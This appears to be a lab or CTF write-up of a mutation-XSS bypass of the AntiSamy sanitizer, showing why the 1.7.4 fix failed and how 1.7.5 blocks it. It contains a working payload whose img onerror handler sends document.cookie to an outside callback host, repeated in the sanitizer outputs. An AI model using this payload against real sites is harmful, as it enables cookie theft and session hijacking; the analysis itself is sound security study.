RESIDUAL PAYLOAD (CVE-2024-23635 bypass -- bang-comment terminator mXSS)
=========================================================================
<div><!--<div/>--!><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"> <li>--></p></div>

Vector: neko 3.6.0 (in AntiSamy 1.7.4) sees <!--...--> as one comment node that includes
the --!> and everything after it up to -->. The comment is preserved (preserveComments=true)
and serialized VERBATIM with the unsanitized <img onerror> inside. The browser's HTML5 parser
treats --!> as a comment close (comment end bang state -> data state), so the <img onerror>
ESCAPES the comment and EXECUTES. This is the mXSS: sanitizer's serialization disagrees with
the browser's parse of the same string. The 1.7.4 fix never handled this comment-ending case.

Server-side output V0 (1.7.3):
  <div>
    <!--<div/>--!><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"> <li>--></div>
  => onerror survives inside preserved comment -> browser mXSS -> EXECUTES -> flag exfiltrated

Server-side output V1 (1.7.4):
  <div>
    <!--<div/>--!><img src=x onerror="document.location='//callback:9000/c?f='+document.cookie"> <li>--></div>
  => IDENTICAL to V0: onerror survives inside preserved comment -> browser mXSS -> EXECUTES -> flag exfiltrated
  => INCOMPLETE FIX: the CVE-2023-43643 fix did NOT address bang-comment endings

Server-side output V2 (1.7.5):
  <div>
    <!--<div/>--><img src="x">
    <li>--&gt;</li>
  </div>
  => neko 3.11.1 + serializer fix: --!> normalized to -->, comment properly closed,
     <img> placed outside comment as visible element but onerror STRIPPED -> BLOCKED

